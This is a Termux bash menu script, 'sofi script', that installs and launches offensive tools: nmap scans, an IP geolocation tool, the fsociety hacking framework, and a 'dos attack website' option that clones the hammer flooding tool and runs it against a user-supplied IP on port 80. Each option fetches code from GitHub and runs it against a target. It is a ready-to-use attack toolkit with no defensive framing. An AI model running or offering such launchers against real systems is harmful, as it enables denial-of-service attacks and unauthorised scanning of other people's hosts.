#!/data/data/com.termux/files/usr/bin/bash


clear
echo -e "                            \e[5mwellcom\e[25m to \e[31msofi\e[0m script                             "
sleep 1
echo -e "\e[31m                          /////////////////////////\e[0m"
echo -e "\e[32m                           ?/////////////////////? \e[0m"
echo -e "  \e[33m                          ?//////////////////?\e[0m"
echo -e "\e[34m                             ?///////////////? \e[0m"
echo -e "\e[33m                              ?/////////////?\e[0m"
echo -e " \e[32m                              ?//////////?\e[0m"
echo -e "\e[33m                                ?////////?\e[0m"
echo -e "\e[35m                                 ?//////?\e[0m"
echo -e "                                  ?////?"
echo -e "\e[36m                                   ?//?\e[0m"
echo -e "                                   ?/?"
echo -e " \e[34m                                  /\e[0m"
echo -e "\e[31m             1:website scanner\e[0m"
echo -e "\e[32m             2:ip location\e[0m"
echo -e "\e[33m             3:devices check port\e[0m"
echo -e "\e[36m             4:dos attack website\e[0m"
echo -e "\e[37m             5:fsociety install\e[0m"
echo -e "\e[5m             6:show your ip\e[25m"

read -p "enter the num===>" p

if [ $p -eq 1 ]; then
	pkg update
	pkg install nmap
	read -p "enter the website ip: " m
	nmap -v ${m}
fi

if [ $p -eq 2 ]; then 
	pkg update
	clear 
	pkg install python
	clear
	pkg install python3
	clear
	pkg install python2
	clear 
	pkg install git
    clear
    git clone https://github.com/maldevel/IPGeoLocation.git
    clear 
    cd IPGeoLocation
    clear 
    pip3 install -r requirements.txt --user
    clear
    read -p "enter the device ip : " i
    python3 ipgeolocation.py -t ${i}
fi

if [ $p -eq 3 ]; then
	pkg install nmap
	clear
	read -p "enter the device ip : " n
	clear 
	nmap -v ${n}

fi

if [ $p -eq 4 ]; then
pkg install python3
clear 
pkg instqll git
clear 
git clone https://github.com/cyweb/hammer.git
clear
cd hammer
chmod +x hammer.py
clear 
read -p "enter the website ip : " w
python3 hammer.py -s ${w} -p 80 -t 135

fi
 
if [ $p -eq 5 ]; then
	pkg update
	pkg install python
	pkg install python2
	clear
	pkg install git
	clear 
	git clone https://github.com/Manisso/fsociety.git
	clear
	cd fsociety
	clear
	chmod +x install.sh
    chmod +x fsociety.py
    clear 
    bash install.sh
    python fsociety.py

fi
if [ $p -eq 6 ]; then
	ifconfig
fi













